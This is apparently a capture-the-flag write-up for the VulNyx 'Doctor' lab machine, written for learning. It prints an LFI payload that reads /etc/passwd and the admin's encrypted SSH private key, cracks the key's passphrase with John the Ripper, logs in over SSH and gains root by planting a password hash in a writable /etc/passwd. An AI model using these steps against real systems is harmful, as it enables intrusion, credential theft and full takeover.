# [VulNyx](https://vulnyx.com/): Doctor Machine Writeup  

<img width="831" height="518" alt="image" src="https://github.com/user-attachments/assets/f821c75f-9eac-47ae-befc-121f963db041" />

---

## 🎯 Target Overview
- Machine Name: Doctor  
- Platform: VulNyx  
- Vulnerabilities:
  - Local File Inclusion (LFI)
  - Misconfigured File Permissions
  - Weak SSH Key Protection  

---

## 🔍 Enumeration

### 🧠 Nmap Scan:
```bash
nmap -n -Pn -sS -p- --min-rate 5000 <IP>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-03 09:25 -0700
Nmap scan report for 192.168.29.37
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:DB:99:B5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 7.57 seconds

```

### 🔎 Results:
- 22/tcp → SSH  
- 80/tcp → HTTP  

---

## 🌐 Web Enumeration

- Opened port 80 in browser → Found **Docmed** website
  
<img width="1254" height="524" alt="Screenshot 2026-05-04 120535" src="https://github.com/user-attachments/assets/6c06351b-8ccc-40ac-97df-755a70db51d1" />

- Navigated to "Doctors" section → identified possible parameter-based inclusion  

---

## ⚠️ Local File Inclusion (LFI)

### 🧠 Exploit:
```bash
http://<IP>/doctor-item.php?include=/../../etc/passwd
```

### 🔎 Result:
- Successfully retrieved `/etc/passwd` file  
- Identified valid user:
```
admin:x:1000:1000:admin:/home/admin:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
admin:x:1000:1000:admin:/home/admin:/bin/bash

```

✔️ Confirms **LFI vulnerability**

---

## 🔑 Extracting SSH Private Key

### 🧠 Exploit via LFI:
```bash
curl http://<IP>/doctor-item.php?include=/../../home/admin/.ssh/id_rsa > id_rsa
```

- Retrieved encrypted private key
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----

```
Result:
- Retrieved SSH private key
- The key is encrypted, as indicated by:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,...
```

---

## 🔓 Cracking SSH Key Passphrase

### Step 1: Convert key for John:
```bash
ssh2john id_rsa > sshhash
```

### Step 2: Crack using John:
```bash
john -w=/usr/share/wordlists/rockyou.txt sshhash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (id_rsa)     
1g 0:00:00:00 DONE (2026-05-03 23:51) 14.28g/s 17828p/s 17828c/s 17828C/s camilo..shirley
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### 🔎 Result:
```
Password = " unicorn "
```

---

## 🔐 SSH Access

### Fix permissions:
```bash
chmod 600 id_rsa
```

### Login:
```bash
ssh -i id_rsa admin@<IP>
```

- Enter passphrase: `unicorn`

✔️ Access gained as **admin**

---

## 🚀 Privilege Escalation

### 🧠 Enumeration:
To identify potential privilege escalation vectors, we searched for writable files across the system:
```bash
find / -type f -writable 2>/dev/null | grep -ivE "proc|sys|var|home"
```

### 🔎 Finding:
```
/etc/passwd
```

⚠️ Critical misconfiguration: writable `/etc/passwd`

---

## 🔐 Exploitation

### Step 1: Generate password hash:
```bash
openssl passwd -1 123456
```

### Step 2: Modify `/etc/passwd`:
```bash
root:x:0:0:root:/root:/bin/bash
```

Replace with:
```bash
root:<hash>:0:0:root:/root:/bin/bash
```

---

## 🔥 Root Access

### Switch user:
```bash
su -
```

- Password: `123456`

✔️ Privilege escalation successful  

---

## 🏁 Flags

### 📄 User Flag:
```bash
cat /home/admin/user.txt
```

```
0819e6dfb35db7c61353************
```

---

### 👑 Root Flag:
```bash
cat /root/root.txt
```

```
dfde8cc67ed8819b2386************
```

---

## 🧾 Summary

| Phase | Technique |
|------|----------|
| Enumeration | Nmap |
| Web Exploitation | LFI |
| Credential Access | SSH Key Extraction |
| Cracking | John the Ripper |
| Initial Access | SSH |
| Privilege Escalation | Writable `/etc/passwd` |

---

## 🚀 Key Takeaways

- LFI can lead to **full system compromise**, not just file reading  
- Always check `.ssh` directories when LFI is available  
- Weak passphrases make encrypted keys useless  
- Writable `/etc/passwd` = **instant root escalation**  
- Misconfigurations are often more dangerous than exploits  

---

**Author:** zer0arc4  
